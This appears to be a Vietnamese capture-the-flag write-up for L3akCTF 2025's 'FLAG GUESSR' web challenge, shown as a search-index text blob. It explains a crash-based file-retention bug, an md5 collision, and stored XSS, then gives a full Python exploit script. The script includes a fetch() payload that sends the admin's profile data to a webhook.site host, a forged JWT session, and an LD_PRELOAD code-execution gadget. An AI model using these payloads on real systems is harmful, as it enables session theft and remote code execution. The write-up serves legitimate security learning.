auto detect content type dựa trên các 512 bytes đầu tiên có khá nhiều cách : https://chromium.googlesource.com/chromium/src/net/+/master/base/mime_sniffer.cc Đơn giản là chèn \u003c!DOCTYPE\u003e prefix vào phía trước thôi.\nVậy hàm này được sử dụng ở đâu ? func GetGuess(w http.ResponseWriter, r *http.Request) { session, valid, resp, err := RequestMiddleware(w, r) defer resp.respond() if err != nil { return } if !valid || !session.LoggedIn { session.ClearSession() session.UpdateSession(w) resp.setError(fmt.Errorf(\u0026quot;not logged in\u0026quot;), http.StatusUnauthorized) return } defer session.UpdateSession(w) guesserID := r.PathValue(\u0026quot;guesser_id\u0026quot;) guessID := r.PathValue(\u0026quot;guess_id\u0026quot;) guesser, err := FindUser(guesserID) if err != nil { resp.setError(fmt.Errorf(\u0026quot;user not found\u0026quot;), http.StatusBadRequest) return } guess, err := guesser.FindGuess(guessID) if err != nil { resp.setError(fmt.Errorf(\u0026quot;guess not found\u0026quot;), http.StatusBadRequest) return } if session.UserKind != UserKindAdmin \u0026amp;\u0026amp; guess.GuesserID != session.UserID { resp.setError(fmt.Errorf(\u0026quot;only admins can see other users' guesses\u0026quot;), http.StatusBadRequest) return } guessPath := guess.GetFilePath() guessBytes, err := os.ReadFile(guessPath) if err != nil { resp.setError(fmt.Errorf(\u0026quot;incorrect guesses not saved\u0026quot;), http.StatusBadRequest) return } resp.Body = guessBytes resp.respondRaw() } Xài duy nhất ở hàm này. Hàm này sẽ đọc từ file đã guess của user và trả về response nên ta cần handle được nội dung trong file đấy. Phần khó chính là hàm checkFlag khá khó chịu :\nfunc CheckFlag(w http.ResponseWriter, r *http.Request) { session, valid, resp, err := RequestMiddleware(w, r) defer resp.respond() if err != nil { return } if !valid || !session.LoggedIn { session.ClearSession() session.UpdateSession(w) resp.setError(fmt.Errorf(\u0026quot;not logged in\u0026quot;), http.StatusUnauthorized) return } defer session.UpdateSession(w) if r.ContentLength == 0 { resp.setError(fmt.Errorf(\u0026quot;missing body\u0026quot;), http.StatusBadRequest) return } defer r.Body.Close() flagGuess := r.FormValue(\u0026quot;flag\u0026quot;) flagHolderID := r.PathValue(\u0026quot;id\u0026quot;) u, err := FindUser(flagHolderID) if err != nil { resp.setError(fmt.Errorf(\u0026quot;user not found\u0026quot;), http.StatusBadRequest) return } if u.UserID == session.UserID { resp.setError(fmt.Errorf(\u0026quot;you can't guess your own flag\u0026quot;), http.StatusBadRequest) return } guess := Guess{ GuessID: uuid.NewString(), GuesserID: session.UserID, FlagHolderID: u.UserID, Correct: false, } alreadyFound, err := guess.CheckFound() if err != nil { resp.setError(err, http.StatusBadRequest) return } if alreadyFound { resp.setError(fmt.Errorf(\u0026quot;you already found that flag\u0026quot;), http.StatusBadRequest) return } err = guess.InsertGuess() if err != nil { resp.setError(err, http.StatusBadRequest) return } guessPath := guess.GetFilePath() err = os.WriteFile(guessPath, []byte(flagGuess), 0644) if err != nil { resp.setError(err, http.StatusBadRequest) return } correct, md5, sha := guess.CheckGuess() if correct { guess.MarkCorrect() } if !correct { os.Remove(guessPath) } else { os.WriteFile(guessPath, []byte(fmt.Sprintf(\u0026quot;MD5: %s\\nSHA256: %s\u0026quot;, md5, sha)), 0644) } resp.Body = FlagCheckResponse{Correct: correct} } Hàm này sẽ kiểm tra md5sum của 2 file có bằng nhau không và sha256 của 2 file có bằng nhau không , nếu không bằng nó sẽ xóa file còn nếu bằng thì nó sẽ viết giá trị của MD5 và SHA256 vào file ?\nCả 2 điều kiện trên mình đều thật sư không cần \u0026hellip; Vậy phải làm sao để ghi file của mình vào ? Đọc vào hàm CheckGuess ta có thể thấy một trigger sau khá dị func (g *Guess) CheckGuess() (bool, string, string) { ... if md5Equal != shaEqual { g.MarkCheater() } ... Nếu như md5 bằng nhưng sha không bằng thì sẽ gọi MarkCheater ? Và trolling ở đây là hàm MarkCheater này sẽ gây crash program do thiếu dấu \u0026ldquo;?\u0026rdquo; holy fack\nMARK_CHEATER = `UPDATE users SET cheater = 1 WHERE user_id = ;` MÌnh đã không nghĩ tới trường hợp này trong lúc giải và cũng đã không test thử function này đó là lý do mình ko tìm được bug . Vì serverr hỗ trợ autorestart nên lúc này hàm crash và file của mình sẽ không bị xóa . Nhưng còn một điều nữa là mình cần phải có md5 EQUAL thì cái nì khá đơn giản vì có lỗi md5 collision khá nổi tiếng và có tool hỗ trợ là fastcoll .\nKhi có được xss thì ta chỉ cần redirect bot tới : /api/users/{guesser_id}/guesses/guess_id Stole được display_name và register với username admin và display_name cùng với session cần được signed và phần còn lại như trên Script của mình :\nimport requests import threading import jwt admin_username = \u0026quot;admin-71aaf14e-55d3-4a88-8c31-e9db2f265c3e\u0026quot; admin_displayName = \u0026quot;eccdce48-7f26-421b-9d75-65f7002453d5\u0026quot; JWT_KEY =\u0026quot;FUCK\u0026quot; FLAG_SO_ID = \u0026quot;\u0026quot; MALICOUS_SESSION =\u0026quot;\u0026quot; url = \u0026quot;http://localhost:5555\u0026quot; url = \u0026quot;http://34.59.119.124:17005\u0026quot; XSS_PATH = \u0026quot;\u0026quot; def register(username, password,display_name=\u0026quot;1337\u0026quot;,payload=None): s= requests.Session() data = { \u0026quot;username\u0026quot;: username, \u0026quot;password\u0026quot;: password, \u0026quot;display_name\u0026quot;: display_name, } token = \u0026quot;\u0026quot; if payload : token = jwt.encode(payload, JWT_KEY, algorithm=\u0026quot;HS256\u0026quot;) with open(\u0026quot;flag.so\u0026quot;, \u0026quot;rb\u0026quot;) as flag_file: files = {\u0026quot;flag\u0026quot;: flag_file} cookies = {\u0026quot;session\u0026quot;: token} response = requests.post(f\u0026quot;{url}/register\u0026quot;,data=data, files=files, cookies=cookies, allow_redirects=False) print(response.cookies) return response def login(username, password): s = requests.Session() data = { \u0026quot;username\u0026quot;: username, \u0026quot;password\u0026quot;: password, } response = s.post(f\u0026quot;{url}/login\u0026quot;, data=data,allow_redirects=False) print(response.cookies) return s def getProfile(session): res = session.get(url+'/api/profile',allow_redirects=False) print(res.text) return res.json() def bot(session) : global XSS_PATH payload = \u0026quot;fetch('/api/profile').then(res=\u0026gt;res.json()).then(text=\u0026gt;fetch('https://webhook.site/49982724-4ed4-4980-bdbc-f7efed1b6335?q='+text.display_name+'\u0026amp;u='+text.username))\u0026quot; data = { \u0026quot;url\u0026quot; : XSS_PATH + \u0026quot;#\u0026quot; +payload } res = session.post(url+'/api/report',json=data) print(res.text) def createMsg1(username,password): s= requests.Session() data = { \u0026quot;username\u0026quot;:username, \u0026quot;password\u0026quot;: password, \u0026quot;display_name\u0026quot;: \u0026quot;1337\u0026quot;, } with open(\u0026quot;msg1.bin\u0026quot;, \u0026quot;rb\u0026quot;) as flag_file: files = {\u0026quot;flag\u0026quot;: flag_file} response = requests.post(f\u0026quot;{url}/register\u0026quot;,data=data, files=files, allow_redirects=False) print(response.cookies) return response def checkFlag(session,checked_id,checker_id) : global XSS_PATH with open(\u0026quot;msg2.bin\u0026quot;, \u0026quot;rb\u0026quot;) as f: data = { \u0026quot;flag\u0026quot;: f.read() } try : response = session.post(f\u0026quot;{url}/api/users/{checked_id}/checkflag\u0026quot;,data=data,allow_redirects=False) print(\u0026quot;FAIL\u0026quot;) except : print(\u0026quot;SUCCESSFULLLY\u0026quot;) res = session.get(f\u0026quot;{url}/api/users/{checker_id}/guesses\u0026quot;,allow_redirects=False) guess_id = res.json()['guesses'][-1]['guess_id'] XSS_PATH += f\u0026quot;/api/users/{checker_id}/guesses/{guess_id}\u0026quot; print(\u0026quot;XSS_URL: \u0026quot;, XSS_PATH) ##Create HasH if admin_displayName ==\u0026quot;\u0026quot; : username= \u0026quot;fucaka\u0026quot; password= \u0026quot;fuckaa\u0026quot; createMsg1(username,password) s = login(username,password) msg1Id = getProfile(s) print(f\u0026quot;MSG1 ID = {msg1Id}\\n\u0026quot;) ## Createt guesser username = \u0026quot;guessers\u0026quot; password = \u0026quot;guessers\u0026quot; register(username,password) s = login(username,password) guesserId = getProfile(s) print(f\u0026quot;GUESSER ID = {guesserId}\u0026quot;) checkFlag(s,msg1Id,guesserId) bot (s) exit(0) ## Now we have the display name ## ## TIME TO EXPLOIT ## register(\u0026quot;SOaaa\u0026quot;,\u0026quot;SOaaa\u0026quot;) s = login(\u0026quot;SOaaa\u0026quot;,\u0026quot;SOaaa\u0026quot;) FLAG_SO = getProfile(s) print(f\u0026quot;FLAG_SO_ID: {FLAG_SO['user_id']}\u0026quot;) props = { \u0026quot;description\u0026quot; : \u0026quot;FUCk\u0026quot; , \u0026quot;LD_PRELOAD\u0026quot; : f\u0026quot;/app/userdata/{FLAG_SO['user_id']}/flag.txt\u0026quot;, } FLAG_SO[\u0026quot;logged_in\u0026quot;] = True FLAG_SO['properties'] = props register (admin_username,\u0026quot;?\u0026quot;,admin_displayName,FLAG_SO) New knowledge Rce gadget through ENV $LD_PRELOAD (mình khong biết điều này nên đã khá vướng bận khi tìm gadget rce) md5 collision Forgery session with race condition ( đôi khi không cần leak jwt key để có một signed session) Rút kinh nghiệm : Đọc kĩ hơn :) Test mọi case đề chặn Trình ","permalink":"http://localhost:1313/writeups/l3akctf2025/flagguessr/","title":"FLAG GUESSR"}]